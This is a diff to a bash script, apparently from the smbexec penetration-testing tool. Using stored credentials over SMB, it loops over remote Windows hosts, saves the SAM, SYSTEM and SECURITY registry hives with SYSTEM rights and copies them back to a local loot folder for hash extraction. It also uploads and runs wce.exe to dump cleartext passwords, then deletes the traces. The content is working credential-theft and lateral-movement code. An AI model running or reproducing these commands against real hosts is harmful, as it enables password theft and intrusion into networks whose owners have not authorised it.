@@ -562,11 +562,25 @@ fi
 
 for i in $(cat $RHOSTS); do
 	# Check to see if login is valid to the system before it attempts anything else
-	$smbexecpath/smbexeclient //$i/C$ -A /tmp/smbexec/smbexec.auth -c "showconnect" >& /tmp/smbexec/connects.tmp
+	$smbexecpath/smbexeclient //$i/IPC$ -A /tmp/smbexec/smbexec.auth -c "showconnect" >& /tmp/smbexec/connects.tmp
 
 	# Check to see what type of error we got so we can tell the user
 	f_smbauthinfo
-	f_smbauthresponse
+
+	if [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
+		echo -e "\n\e[1;32m[+] Authentication to $i successful...\e[0m"
+	elif [ -s /tmp/smbexec/success.chk ] && [ ! -z "$badshare" ]; then
+		echo -e "\n\e[1;33m[*] Authentication to $i was successful, but the share doesn't exist\e[0m"
+	elif [ ! -z "$logonfail" ]; then
+		echo -e "\n\e[1;31m[-] Authentication to $i failed\e[0m"
+	elif [ ! -z "$connrefused" ]; then
+		echo -e "\n\e[1;31m[-] Connection to $i was refused\e[0m"
+	elif [ ! -z "$unreachable" ]; then
+		echo -e "\n\e[1;31m[-] There is no host assigned to IP address $i \e[0m"
+	else
+		echo -e "\n\e[1;33m[*] I'm not sure what happened, supplying output...\e[0m"
+		cat /tmp/smbexec/connects.tmp | egrep -i '(error|failed:)'
+	fi
 
 	# Get successful IP addy for cleanup later
 	ConnCheck=$(cat /tmp/smbexec/connects.tmp | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u)
@@ -576,12 +590,13 @@ for i in $(cat $RHOSTS); do
 		echo $ConnCheck >> /tmp/smbexec/hosts.loot.tmp # Place successful connection IPs into a holding file
 		if [ ! -d $logfldr/hashes/$i ]; then mkdir $logfldr/hashes/$i; fi
 		# Get the registry keys
-		$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg.exe save HKLM\SAM %WINDIR%\Temp\sam && reg.exe save HKLM\SYSTEM %WINDIR%\Temp\sys && reg.exe save HKLM\SECURITY %WINDIR%\Temp\sec" &> /dev/null
-		$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "CMD /C echo %WINDIR%" &> /tmp/smbexec/windir.info
-		windir=$(cat /tmp/smbexec/windir.info| cut -d "\\" -f2|tr -d '\r')
-		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get $windir\\Temp\\sam $logfldr/hashes/$i/sam" &> /dev/null
-		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get $windir\\Temp\\sec $logfldr/hashes/$i/sec" &> /dev/null
-		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get $windir\\Temp\\sys $logfldr/hashes/$i/sys" &> /dev/null
+		$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "CMD /C echo %TEMP%" &> /tmp/smbexec/tempdir.info
+		temp_drive=$(cat /tmp/smbexec/tempdir.info| cut -d ":" -f1|tr -d '\r')
+		temp_dir=$(cat /tmp/smbexec/tempdir.info| awk -F':' '{ print $2 }'|tr -d '\r')
+		$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg.exe save HKLM\SAM %TEMP%\sam && reg.exe save HKLM\SYSTEM %TEMP%\sys && reg.exe save HKLM\SECURITY %TEMP%\sec" &> /dev/null
+		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/$temp_drive$ -c "get $temp_dir\\sam $logfldr/hashes/$i/sam" &> /dev/null
+		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/$temp_drive$ -c "get $temp_dir\\sec $logfldr/hashes/$i/sec" &> /dev/null
+		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/$temp_drive$ -c "get $temp_dir\\sys $logfldr/hashes/$i/sys" &> /dev/null
 	
 		#Get the hashes out of the reg keys
 		if [ -e $logfldr/hashes/$i/sam ] && [ -e $logfldr/hashes/$i/sys ]; then
@@ -597,16 +612,16 @@ for i in $(cat $RHOSTS); do
 		fi
 		
 		#Get the clear text passwords with protected wce
-		if [ $wce == 1 ]; then
-			$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "put $smbexecpath/wce.exe $windir\\Temp\\wce.exe" &> /dev/null
-			$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C %WINDIR%\\Temp\\wce.exe -w" &> /tmp/smbexec/wce.tmp
+		if [ "$wce" == 1 ]; then
+			$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/$temp_drive$ -c "put $smbexecpath/wce.exe %TEMP%\\wce.exe" &> /dev/null
+			$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C %TEMP%\wce.exe -w" &> /tmp/smbexec/wce.tmp
 			#Put the passwords in a text file in the logfolder
 			cat /tmp/smbexec/wce.tmp|grep ":" > $logfldr/hashes/$i/cleartext.pwds
 			#cleanup the host including wce.exe
-			$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL %WINDIR%\Temp\sam && DEL %WINDIR%\Temp\sec && DEL %WINDIR%\Temp\sys && DEL %WINDIR%\Temp\wce.exe" #&> /dev/null
+			$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL %TEMP%\sam && DEL %TEMP%\sec && DEL %TEMP%\sys && DEL %TEMP%\wce.exe" &> /dev/null
 		else
 			#cleanup the host minus wce.exe
-			$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL %WINDIR%\Temp\sam && DEL %WINDIR%\Temp\sec && DEL %WINDIR%\Temp\sys" &> /dev/null
+			$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL %TEMP%\sam && DEL %TEMP%\sec && DEL %TEMP%\sys" &> /dev/null
 		fi
 	fi
 
